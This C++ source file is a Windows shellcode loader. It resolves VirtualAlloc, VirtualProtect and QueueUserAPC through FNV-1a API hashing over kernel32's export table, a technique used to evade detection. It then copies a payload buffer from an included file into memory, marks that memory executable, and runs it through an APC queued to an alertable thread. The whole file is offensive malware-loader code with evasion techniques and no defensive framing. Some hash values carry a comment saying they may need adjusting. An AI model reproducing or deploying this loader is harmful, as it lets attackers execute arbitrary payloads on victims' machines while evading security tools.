#include <Windows.h>
#include <stdio.h>
#include <iostream>

#include "base.cpp"

// Define FNV-1a (Fowler-Noll-Vo) hashing function for API hashing.
unsigned int hash_api(const char* str) {
    unsigned int hash = 2166136261U;
    while (*str) {
        hash ^= (unsigned int)(*str++);
        hash *= 16777619;
    }
    return hash;
}

int main() {
    // Define standard variable stubs.
    HANDLE hThread = NULL;
    DWORD dwThreadId = 0;  // Should be 0, not NULL
    DWORD dwOldProtection = 0;

    // Grab a module handle for kernel32.dll.
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) {
        std::cout << "Failed to get kernel32 handle" << std::endl;
        return 1;
    }

    // Resolve necessary WinAPI functions.
    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef DWORD(WINAPI* QueueUserAPC_t)(PAPCFUNC, HANDLE, ULONG_PTR);

    VirtualAlloc_t pVirtualAlloc = NULL;
    VirtualProtect_t pVirtualProtect = NULL;
    QueueUserAPC_t pQueueUserAPC = NULL;

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)kernel32;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)kernel32 + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)kernel32 + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* nameRVA = (DWORD*)((BYTE*)kernel32 + exportDirectory->AddressOfNames);
    DWORD* functionRVA = (DWORD*)((BYTE*)kernel32 + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)kernel32 + exportDirectory->AddressOfNameOrdinals);

    for (unsigned int i = 0; i < exportDirectory->NumberOfNames; i++) {
        const char* functionName = (const char*)((BYTE*)kernel32 + nameRVA[i]);
        if (hash_api(functionName) == 0x3285501) {  // Adjust hash values if necessary
            pVirtualAlloc = (VirtualAlloc_t)((BYTE*)kernel32 + functionRVA[ordinals[i]]);
        }
        if (hash_api(functionName) == 0x820621F3) {
            pVirtualProtect = (VirtualProtect_t)((BYTE*)kernel32 + functionRVA[ordinals[i]]);
        }
        if (hash_api(functionName) == 0x890BB4FB) {
            pQueueUserAPC = (QueueUserAPC_t)((BYTE*)kernel32 + functionRVA[ordinals[i]]);
        }
    }

    if (!pVirtualAlloc || !pVirtualProtect || !pQueueUserAPC) {
        std::cout << "Failed to resolve necessary functions" << std::endl;
        return 1;
    }

    // Create the thread running "an alertable function".
    hThread = CreateThread(NULL, 0, [](LPVOID lpParam) -> DWORD {
        HANDLE x = CreateEvent(NULL, FALSE, FALSE, NULL);
        HANDLE y = CreateEvent(NULL, FALSE, FALSE, NULL);
        if (x && y) {
            SignalObjectAndWait(x, y, INFINITE, TRUE);
            CloseHandle(x);
            CloseHandle(y);
        }
        return 0;
    }, NULL, 0, &dwThreadId);

    if (hThread == NULL) {
        std::cout << "Failed to create thread" << std::endl;
        return 1;
    }

    // Allocate memory for the payload.
    PVOID pAddress = pVirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        std::cout << "Failed to allocate memory" << std::endl;
        return 1;
    }

    // Write the shellcode to the allocated memory.
    memcpy(pAddress, buf, sizeof(buf));

    // Change memory protection to executable.
    if (!pVirtualProtect(pAddress, sizeof(buf), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        std::cout << "Failed to change memory protection" << std::endl;
        return 1;
    }

    // Queue the user via APC.
    if (!pQueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        std::cout << "Failed to queue user APC" << std::endl;
        return 1;
    }

    // Wait for the thread to alert.
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
